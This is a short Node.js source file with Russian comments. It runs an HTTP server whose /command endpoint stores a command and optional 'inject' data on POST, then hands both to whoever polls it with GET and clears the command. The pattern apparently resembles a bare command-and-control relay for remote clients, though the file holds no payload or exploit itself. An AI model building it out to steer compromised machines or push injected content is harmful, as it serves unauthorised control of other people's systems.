const http = require('http');

let lastCommand = "";
let injectData = null; // Храним данные о новом инжекте

const server = http.createServer((req, res) => {
  // POST /command - установка команды
  if (req.url === '/command' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const data = JSON.parse(body);
      lastCommand = data.command;
      if (data.type === "inject") injectData = data.info; // Сохраняем данные инжекта
      res.writeHead(200);
      res.end("OK");
    });
    return;
  }

  // GET /command - получение команды
  if (req.url === '/command' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ 
      command: lastCommand,
      injectData: injectData // Отправляем данные обратно
    }));
    lastCommand = ""; // Очищаем команду
    return;
  }

  res.writeHead(404);
  res.end("Not Found");
});

server.listen(process.env.PORT || 3000);
